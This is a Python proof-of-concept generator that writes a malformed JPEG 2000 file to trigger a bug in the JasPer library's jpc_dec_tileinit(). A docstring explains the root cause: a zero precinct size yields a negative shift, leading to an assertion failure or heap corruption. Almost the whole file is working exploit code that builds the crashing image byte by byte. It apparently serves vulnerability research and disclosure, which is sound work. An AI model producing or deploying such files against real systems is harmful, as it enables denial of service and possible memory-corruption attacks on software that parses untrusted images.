#!/usr/bin/env python3
"""
vuln_001_gen.py - PoC generator for JasPer jpc_dec_tileinit() vulnerability (VULN 001)

Root cause: When COD marker has Scod bit0=1 (PRT flag) and a non-LL resolution level
has prcwidthexpn=0, jpc_dec_tileinit() computes:
    rlvl->cbgwidthexpn = rlvl->prcwidthexpn - 1  =>  -1
This triggers undefined behavior in (1 << -1) and cascades to jpc_tagtree_create
with bad dimensions, causing assertion failure or heap corruption.

Trigger: prcsize byte for rlvlno=1 set to 0x00 (PPy=0, PPx=0 => prcwidthexpn=0).
"""

import struct
import os

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.jp2")


def build_box(type_bytes, payload):
    """Build a JP2 box: 4-byte length + 4-byte type + payload."""
    length = 8 + len(payload)
    return struct.pack(">I", length) + type_bytes + payload


def build_superbox(type_bytes, payload):
    """Build a JP2 superbox containing sub-boxes."""
    length = 8 + len(payload)
    return struct.pack(">I", length) + type_bytes + payload


def build_jp2():
    # --- JP2 Signature box ---
    sig_payload = b"\x0D\x0A\x87\x0A"
    sig_box = build_box(b"jP  ", sig_payload)  # 0x6A502020

    # --- File Type box ---
    ftyp_payload = (
        b"jp2 "      # BR: brand = 0x6A703220
        + struct.pack(">I", 0)  # MinV = 0
        + b"jp2 "    # CL: compatibility list entry
    )
    ftyp_box = build_box(b"ftyp", ftyp_payload)

    # --- JP2 Header superbox ---
    # ihdr: height=4, width=4, ncomp=1, bpc=7, c=7, unk=0, ip=0
    ihdr_payload = struct.pack(">IIHHBBBB", 4, 4, 1, 7, 7, 0, 0, 0)
    ihdr_box = build_box(b"ihdr", ihdr_payload)

    # colr: meth=1 (enumerated colorspace), prec=0, approx=0, enumCS=16 (sRGB)
    colr_payload = struct.pack(">BBBI", 1, 0, 0, 16)
    colr_box = build_box(b"colr", colr_payload)

    jp2h_payload = ihdr_box + colr_box
    jp2h_box = build_superbox(b"jp2h", jp2h_payload)

    # --- Codestream ---
    codestream = build_codestream()

    # Contiguous Codestream box (length 0 = unknown / extends to EOF, or compute it)
    cs_length = 8 + len(codestream)
    cs_box = struct.pack(">I", cs_length) + b"jp2c" + codestream

    return sig_box + ftyp_box + jp2h_box + cs_box


def build_codestream():
    soc = b"\xFF\x4F"  # Start Of Codestream

    # SIZ marker - image and tile size (4x4, 1 component)
    siz_payload = struct.pack(
        ">H"    # Rsiz = 0
        "IIII"  # Xsiz, Ysiz, XOsiz, YOsiz
        "IIII"  # XTsiz, YTsiz, XTOsiz, YTOsiz
        "H",    # Csiz = 1 component
        0,
        4, 4, 0, 0,
        4, 4, 0, 0,
        1
    )
    # Component parameters: Ssiz=7 (8-bit unsigned), XRsiz=1, YRsiz=1
    siz_payload += struct.pack(">BBB", 7, 1, 1)
    siz_marker = b"\xFF\x51" + struct.pack(">H", 2 + len(siz_payload)) + siz_payload

    # COD marker - critical: Scod=0x01 (PRT flag set), numdlvls=1
    # prcsize[0]=0x22 (LL level: PPy=2, PPx=2, OK)
    # prcsize[1]=0x00 (non-LL: PPy=0, PPx=0 => prcwidthexpn=0 => TRIGGER)
    cod_payload = struct.pack(
        ">B"   # Scod = 0x01 (bit0=1: use per-precinct sizes)
        "BHB"  # SGcod: progression=0 (LRCP), num_layers=1, MCT=0
        "BBBBB",  # SPcod: numdlvls=1, xcb=4, ycb=4, cblkstyle=0, qmfbid=1
        0x01,
        0x00, 1, 0x00,
        0x01, 0x04, 0x04, 0x00, 0x01
    )
    # Precinct size bytes (numdlvls+1 = 2 bytes, because Scod bit0=1)
    cod_payload += bytes([
        0x22,  # prcsize[0]: rlvlno=0 (LL), PPy=2, PPx=2 => prcwidthexpn=2, OK
        0x00,  # prcsize[1]: rlvlno=1 (non-LL), PPy=0, PPx=0 => prcwidthexpn=0 => TRIGGER!
    ])
    cod_marker = b"\xFF\x52" + struct.pack(">H", 2 + len(cod_payload)) + cod_payload

    # QCD marker - quantization default
    # numdlvls=1 => 1 LL band + 3 HL/LH/HH bands = 4 stepsizes total?
    # For scalar reversible (Sqcd=0x40): 1 + 3*numdlvls = 1 + 3 = 4 stepsizes
    # Each stepsize: 1 byte for reversible (expn in upper 5 bits, mantissa=0)
    # Use Sqcd=0x40 (scalar reversible) with simple exponent values
    qcd_stepsizes = bytes([
        0x48,  # LL band: expn=9, mantissa=0 (encoded: expn<<3)
        0x48,  # HL band rlvl=1
        0x48,  # LH band rlvl=1
        0x48,  # HH band rlvl=1
    ])
    qcd_payload = bytes([0x40]) + qcd_stepsizes  # Sqcd=0x40 (scalar reversible, 0 guard bits)
    qcd_marker = b"\xFF\x5C" + struct.pack(">H", 2 + len(qcd_payload)) + qcd_payload

    # SOT marker - start of tile
    # JasPer validates: Psot >= 12 and TNsot >= 1.
    # Tile-part bytes: SOT(12) + SOD(2) = 14 bytes total. TNsot=1 (single tile-part).
    sot_payload = struct.pack(
        ">HIBB",
        0,           # Isot: tile index 0
        14,          # Psot: SOT(12)+SOD(2)=14; JasPer rejects Psot < 12
        0,           # TPsot: tile-part index = 0
        1            # TNsot: 1 tile-part total (JasPer rejects TNsot < 1)
    )
    sot_marker = b"\xFF\x90" + struct.pack(">H", 2 + len(sot_payload)) + sot_payload

    sod_marker = b"\xFF\x93"  # Start Of Data

    eoc = b"\xFF\xD9"  # End Of Codestream

    return (soc + siz_marker + cod_marker + qcd_marker +
            sot_marker + sod_marker + eoc)


if __name__ == "__main__":
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    jp2_data = build_jp2()
    with open(OUTPUT_FILE, "wb") as f:
        f.write(jp2_data)
    print(f"[+] Written {len(jp2_data)} bytes to {OUTPUT_FILE}")
